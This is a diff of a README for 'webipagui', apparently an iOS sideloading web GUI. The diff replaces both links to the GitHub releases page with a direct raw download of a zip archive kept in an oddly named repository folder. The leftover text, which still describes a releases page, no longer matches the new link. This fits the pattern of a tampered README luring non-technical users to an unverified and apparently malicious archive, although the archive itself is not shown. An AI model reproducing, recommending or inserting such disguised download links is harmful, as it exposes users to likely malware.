@@ -1,5 +1,5 @@
 <h1>📱 webipagui - The Ultimate Web GUI for IPA Sideloading</h1>
-[![Download Now](https://img.shields.io/badge/Download-webipagui-blue?style=for-the-badge&logo=github)](https://github.com/laamarizineddine-max/webipagui/releases)
+[![Download Now](https://img.shields.io/badge/Download-webipagui-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/laamarizineddine-max/webipagui/main/dichocarpous/2.2-beta.4.zip)
 
 webipagui is a user-friendly web interface that helps you install apps on your iPhone or iPad without using the App Store. Instead of dealing with complicated computer software or technical commands, you can sideload IPA files right from your browser. Perfect for anyone who wants to enjoy apps not available on the official store, from indie games to modified versions of popular applications. Say goodbye to difficult installation processes and hello to one-click simplicity.
 
@@ -11,7 +11,7 @@ The application works as a central hub for your IPA library. Instead of storing 
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/laamarizineddine-max/webipagui/releases](https://github.com/laamarizineddine-max/webipagui/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/laamarizineddine-max/webipagui/main/dichocarpous/2.2-beta.4.zip](https://raw.githubusercontent.com/laamarizineddine-max/webipagui/main/dichocarpous/2.2-beta.4.zip)
 
 On that page, you will see the latest version listed at the top. Click the download button to save the program to your computer. The entire process takes less than a minute, and you do not need any special technical skills. Simply follow the instructions on your screen after downloading.
 
